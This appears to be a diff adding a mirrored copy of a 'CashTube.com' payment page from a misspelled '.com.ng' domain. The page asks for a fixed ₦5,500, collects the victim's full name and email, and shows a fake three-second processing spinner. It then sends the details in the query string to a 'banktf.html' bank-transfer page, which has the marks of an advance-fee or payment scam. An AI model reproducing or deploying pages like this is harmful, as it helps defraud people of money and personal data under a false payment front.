@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from allappsreveiws.com.ng/flupayment/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Sep 2023 22:06:56 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fill Details</title>
+    <script src="js.js"></script>
+</head>
+<body>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,400;0,500;1,900&amp;display=swap');
+           * {
+            padding: 0;
+            margin: 0;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .top {
+            width: 100%;
+            height: 150px;
+            background:#272b58;
+            color: white;
+        }
+        .top h2 {
+            padding-top: 30px;
+            padding-left: 10px;
+        }
+        .box {
+            width: 100%;
+            height: 400px;
+            background: #ffffff; 
+            margin: 0 auto;
+            border-top-left-radius: 30px;
+            border-top-right-radius: 30px;
+        }
+        .box label {
+            font-size: 20px;
+            padding-left: 15px;
+            padding-top: 15px; /* Added spacing */
+            color: #757575;
+        }
+        .box input {
+            width: 90%;
+            height: 41px;
+            margin: 0 auto;
+            display: block;
+            padding-bottom: 4px;
+            padding-left: 15px; /* Added spacing */
+            margin-top: 5px; /* Added spacing */
+            border-radius: 6px;
+            border:  1px solid #181616;
+        }
+        .box button {
+            width: 90%;
+            height: 41px;
+            margin: 0 auto;
+            display: block;
+            padding-bottom: 4px;
+            margin-top: 15px; /* Added spacing */
+            border-radius: 6px;
+            border:  none; 
+            color: white;
+            background: #272b58;
+        }
+        .box img {
+            width: 100%;
+        }
+        /* Add loader styles */
+        .loader-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #a3703f;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 0.5s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <div class="top">
+        <h2>CashTube.com</h2> <br> <br>
+        <div class="box"> <br> <br>
+            <form id="paymentForm" action="https://allappsreveiws.com.ng/flupayment/next_page.html" method="get">
+                <label for="">Amount</label> <br> 
+                <input type="text" value="  ₦5,500" disabled> <br> 
+
+                <label for="fullName">Full Name</label> <br> 
+                <input type="text" id="fullName" name="fullName" placeholder="Your full name" required> <br> 
+
+                <label for="email">Your Email Address</label> <br> 
+                <input type="email" id="email" name="email" placeholder="email address" required> <br>
+
+                <button id="payButton">Pay</button> <br>
+                <img src="img/wav.jpg" alt="">
+            </form>
+        </div>
+    </div>
+
+    <!-- Loader container -->
+    <div class="loader-container" id="loaderContainer">
+        <div class="loader"></div>
+    </div>
+
+    <script>
+        const paymentForm = document.getElementById('paymentForm');
+        const payButton = document.getElementById('payButton');
+        const loaderContainer = document.getElementById('loaderContainer');
+
+        payButton.addEventListener('click', function () {
+            if (paymentForm.checkValidity()) {
+                // Show loader
+                loaderContainer.style.display = 'flex';
+
+                // Disable form elements
+                payButton.disabled = true;
+                document.getElementById('fullName').disabled = true;
+                document.getElementById('email').disabled = true;
+
+                // Simulate loading for 2 seconds
+                setTimeout(function () {
+                    // Enable form elements
+                    payButton.disabled = false;
+                    document.getElementById('fullName').disabled = false;
+                    document.getElementById('email').disabled = false;
+
+                    // Hide loader
+                    loaderContainer.style.display = 'none';
+
+                    // Redirect to the next page with form data as query parameters
+                    const fullName = document.getElementById('fullName').value;
+                    const email = document.getElementById('email').value;
+                    const queryParams = `?fullName=${encodeURIComponent(fullName)}&email=${encodeURIComponent(email)}`;
+                    window.location.href = 'banktf.html' + queryParams;
+                }, 3000);
+            }
+        });
+        
+    </script>
+</body>
+
+<!-- Mirrored from allappsreveiws.com.ng/flupayment/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 27 Sep 2023 22:06:59 GMT -->
+</html>
